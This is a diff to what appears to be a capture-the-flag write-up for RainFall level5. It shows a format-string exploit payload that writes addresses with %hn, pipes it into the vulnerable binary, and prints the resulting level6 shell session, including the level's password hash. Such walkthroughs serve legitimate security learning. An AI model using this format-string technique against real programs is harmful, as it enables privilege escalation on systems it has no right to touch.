@@ -514,12 +514,10 @@ Payload :
 - %5$hn : write 33956 to 5th argument (actually start of format string + 4)
 
 ```console
-$ (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn"' ; cat -) | ./level5
+level5@RainFall:~$ (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn"' ; cat -) | ./level5
 [...]
-whoami
+$ whoami
 level6
-cat .pass
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+$ cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
-
-(printf "\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4\$hn%31904d%5\$hn"; cat) | ./level5
